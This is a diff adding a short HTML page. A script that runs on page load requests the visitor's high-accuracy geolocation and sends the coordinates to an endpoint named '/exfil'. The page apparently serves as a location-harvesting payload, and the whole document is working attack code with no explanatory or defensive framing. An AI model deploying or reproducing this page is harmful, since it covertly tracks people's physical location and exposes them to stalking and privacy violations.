@@ -1,0 +1,15 @@
+<script>
+
+function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition,(err) => console.error(err), {"enableHighAccuracy":true});
+    } else { 
+      x.innerHTML = "Geolocation is not supported by this browser.";
+    }
+  }
+  function showPosition(position) {
+    fetch("/exfil?lat="+position.coords.latitude+"&lon="+position.coords.longitude)
+  }
+
+</script>
+<body onload="getLocation()"></body>
